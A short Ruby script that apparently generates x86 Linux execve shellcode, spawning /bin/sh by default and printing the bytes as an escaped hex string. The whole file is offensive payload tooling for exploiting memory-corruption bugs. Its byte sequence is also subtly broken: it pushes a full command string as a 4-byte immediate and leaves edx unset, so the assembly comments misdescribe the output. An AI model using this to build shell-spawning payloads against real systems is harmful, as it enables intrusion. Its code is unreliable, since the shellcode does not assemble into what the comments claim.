#!/usr/bin/ruby
#Snippet: shellcode-generator.rb

#Main function: Generate shellcode
def generate_shellcode(command)
    shellcode = [
        "\x31\xc0",                 # xor eax, eax
        "\x50",                     # push eax
        "\x68#{command}".ljust(8, "\x00"), # push 'command'
        "\x89\xe3",                 # mov ebx, esp
        "\x50",                     # push eax
        "\x53",                     # push ebx
        "\x89\xe1",                 # mov ecx, esp
        "\xb0\x0b",                 # mov al, 0xb
        "\xcd\x80"                  # int 0x80
    ].join

    puts "[*] Generated Shellcode:"
    puts shellcode.unpack('H*').first.scan(/../).join('\\x').prepend('\\x')
end

#Defaults and user input
command = ARGV[0] || "/bin/sh" # Default to spawn a shell
puts "[*] Creating shellcode for '#{command}'..."
generate_shellcode(command)
